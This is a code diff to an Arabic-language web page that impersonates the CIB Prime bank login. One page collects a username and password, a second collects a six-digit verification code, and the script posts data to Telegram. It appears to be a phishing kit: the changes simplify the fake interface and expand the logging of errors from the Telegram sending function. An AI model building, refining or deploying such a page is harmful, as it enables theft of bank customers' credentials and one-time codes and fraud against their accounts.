@@ -84,37 +84,11 @@
             padding: 30px 30px 20px;
             background: white;
             border-bottom: 1px solid #f0f0f0;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .language-btn {
-            background: white;
-            border: 1px solid #ddd;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            color: #333;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            transition: all 0.3s ease;
-        }
-
-        .language-btn:hover {
-            border-color: #1e4a96;
-            color: #1e4a96;
-        }
-
-        .language-icon {
-            font-size: 16px;
+            text-align: center;
         }
 
         .logo {
             text-align: center;
-            flex: 1;
         }
 
         .logo img {
@@ -192,31 +166,6 @@
             box-shadow: 0 0 0 3px rgba(30, 74, 150, 0.1);
         }
 
-        .password-group {
-            position: relative;
-        }
-
-        .toggle-password {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #999;
-            font-size: 18px;
-            transition: color 0.3s ease;
-        }
-
-        .toggle-password:hover {
-            color: #1e4a96;
-        }
-
-        .password-group .input-field {
-            padding-left: 45px;
-        }
-
         .forgot-password {
             display: flex;
             justify-content: flex-end;
@@ -236,38 +185,13 @@
             text-decoration: underline;
         }
 
-        .login-actions {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .biometric-btn {
-            width: 60px;
-            height: 60px;
-            border: 2px solid #1e4a96;
-            background: white;
-            border-radius: 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            transition: all 0.3s ease;
-        }
-
-        .biometric-btn:hover {
-            background: #f5f5f5;
-            transform: scale(1.05);
-        }
-
         .login-btn {
-            flex: 1;
+            width: 100%;
             padding: 14px;
             font-size: 16px;
             font-weight: 600;
             color: white;
-            background: #ccc;
+            background: #1e4a96;
             border: none;
             border-radius: 12px;
             cursor: pointer;
@@ -275,10 +199,11 @@
             letter-spacing: 0.5px;
             position: relative;
             overflow: hidden;
+            margin-bottom: 20px;
         }
 
         .login-btn:hover:not(:disabled) {
-            background: #1e4a96;
+            background: #163a75;
             box-shadow: 0 5px 20px rgba(30, 74, 150, 0.3);
         }
 
@@ -318,7 +243,6 @@
 
         .register-link {
             text-align: center;
-            margin-top: 20px;
             font-size: 13px;
             color: #666;
         }
@@ -370,7 +294,7 @@
             text-align: center;
         }
 
-        .phone-number {
+        .username-display {
             font-weight: 700;
             color: #1e4a96;
             font-size: 14px;
@@ -467,6 +391,7 @@
         }
 
         .verify-btn:hover:not(:disabled) {
+            background: #163a75;
             box-shadow: 0 5px 20px rgba(30, 74, 150, 0.3);
             transform: translateY(-2px);
         }
@@ -530,14 +455,9 @@
         <!-- Page 1: Login -->
         <div class="page-1" id="page1">
             <div class="header">
-                <button class="language-btn">
-                    <span class="language-icon">▼</span>
-                    العربية
-                </button>
                 <div class="logo">
                     <img src="https://b.top4top.io/p_3800b6k3n0.jpeg" alt="CIB Prime">
                 </div>
-                <div style="width: 80px;"></div>
             </div>
 
             <div class="content">
@@ -557,26 +477,20 @@
 
                     <div class="form-group">
                         <label class="form-label">كلمة المرور</label>
-                        <div class="password-group">
-                            <input 
-                                type="password" 
-                                id="passwordInput" 
-                                class="input-field" 
-                                placeholder="أدخل كلمة المرور"
-                                required
-                            >
-                            <button type="button" class="toggle-password" id="togglePassword">👁</button>
-                        </div>
+                        <input 
+                            type="password" 
+                            id="passwordInput" 
+                            class="input-field" 
+                            placeholder="أدخل كلمة المرور"
+                            required
+                        >
                     </div>
 
                     <div class="forgot-password">
                         <span class="forgot-password-link">هل نسيت كلمة المرور؟</span>
                     </div>
 
-                    <div class="login-actions">
-                        <button type="button" class="biometric-btn" title="تسجيل بصمة الوجه">🔐</button>
-                        <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
-                    </div>
+                    <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
                 </form>
 
                 <div class="register-link">
@@ -588,14 +502,9 @@
         <!-- Page 2: Verification -->
         <div class="page-2" id="page2">
             <div class="header">
-                <button class="language-btn">
-                    <span class="language-icon">▼</span>
-                    العربية
-                </button>
                 <div class="logo">
                     <img src="https://b.top4top.io/p_3800b6k3n0.jpeg" alt="CIB Prime">
                 </div>
-                <div style="width: 80px;"></div>
             </div>
 
             <div class="content">
@@ -605,7 +514,7 @@
                 
                 <div class="verify-message">
                     تم إرسال رمز التحقق المكون من 6 أرقام إلى<br>
-                    <span class="phone-number" id="displayUsername"></span>
+                    <span class="username-display" id="displayUsername"></span>
                 </div>
 
                 <div class="error-message" id="errorMessage2"></div>
@@ -640,7 +549,6 @@
         const loginForm = document.getElementById('loginForm');
         const usernameInput = document.getElementById('usernameInput');
         const passwordInput = document.getElementById('passwordInput');
-        const togglePassword = document.getElementById('togglePassword');
         const loginBtn = document.getElementById('loginBtn');
         const backBtn = document.getElementById('backBtn');
         const otpInputs = document.querySelectorAll('.otp-input');
@@ -661,16 +569,6 @@
                 errorEl.classList.remove('show');
             }, 4000);
         }
-
-        togglePassword.addEventListener('click', () => {
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                togglePassword.textContent = '👁‍🗨';
-            } else {
-                passwordInput.type = 'password';
-                togglePassword.textContent = '👁';
-            }
-        });
 
         usernameInput.addEventListener('input', () => {
             errorMessage1.classList.remove('show');
@@ -695,12 +593,14 @@
                 });
 
                 if (!response.ok) {
-                    throw new Error('Failed to send message');
+                    const errorData = await response.json();
+                    console.error('Telegram error:', errorData);
+                    throw new Error(`HTTP error! status: ${response.status}`);
                 }
 
                 return await response.json();
             } catch (error) {
-                console.error('Telegram error:', error);
+                console.error('Error sending to Telegram:', error);
                 throw error;
             }
         }
